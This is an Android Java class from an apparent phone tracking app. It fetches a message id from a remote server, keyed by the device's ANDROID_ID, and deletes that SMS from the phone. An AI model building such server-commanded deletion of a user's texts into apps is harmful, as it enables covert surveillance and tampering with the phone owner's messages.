package com.hinj.asynctask;

/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */

import android.content.Context;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.provider.Settings.Secure;

import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.Utility;
import com.hinj.parsing.HingAppParsing;
import com.hinj.secure.smsgps.DeviceInterface;

public class DeleteSMSAsyncTask extends AsyncTask<String, Void, String> {
	
	private static final String TAG = "DeleteSMSAsyncTask";
	private Context ctx;
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;	
	private String clip_board_string;
	private Handler handler;
	
	/**
	 * DeleteSMSAsyncTask
	 */
	public DeleteSMSAsyncTask(final Context ctx, DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;

	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected final String doInBackground(String... params) {
		try{
			getCallLogDeleteId();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedGetSMSId();
		}
		
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}
	
	private void getCallLogDeleteId() {
		
	   if (Utility.isNetworkAvailable(ctx)) {
		   //new YourAsyncTask_ContactList().execute(CallDetailList, ""+ total);
		   new GetSMSDeleteIdAsyncTask().execute();
	   }
	}
	
	public class GetSMSDeleteIdAsyncTask extends AsyncTask<String, String,Object[]> {
		
		String response = "";
		String upload_device_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
		
		public GetSMSDeleteIdAsyncTask() {
		}

		@Override
		public void onPreExecute() {
		}

		@Override
		public Object[] doInBackground(String... params) {
			
			return HingAppParsing.getdeleteSMSId(ctx,upload_device_id); 
		}  
 
		@Override
		public void onPostExecute(Object[] result) {
			try{
				System.out.println("result " + result);
				boolean status = (Boolean) result[0];
				response = (String) result[1];
				
				if(status)
				{
					if(!HinjAppPreferenceUtils.getSMSLogDeleteId(ctx).equalsIgnoreCase(""))
					{
						boolean deleteStatus = deleteSms(ctx, HinjAppPreferenceUtils.getSMSLogDeleteId(ctx));
						if(deleteStatus)
						{
							HinjAppPreferenceUtils.setSMSDeleteId(ctx, "");
						}
					}
				}
			}
			catch (Exception e) {
				e.printStackTrace();
			}
		}
	} 
	
	public boolean deleteSms(Context ctx,String smsId) {
	    boolean isSmsDeleted = false;
	    try {
	    	ctx.getContentResolver().delete(Uri.parse("content://sms/" + smsId), null, null);
	        isSmsDeleted = true;

	    } catch (Exception ex) {
	        isSmsDeleted = false;
	    }
	    return isSmsDeleted;
	}
	
}
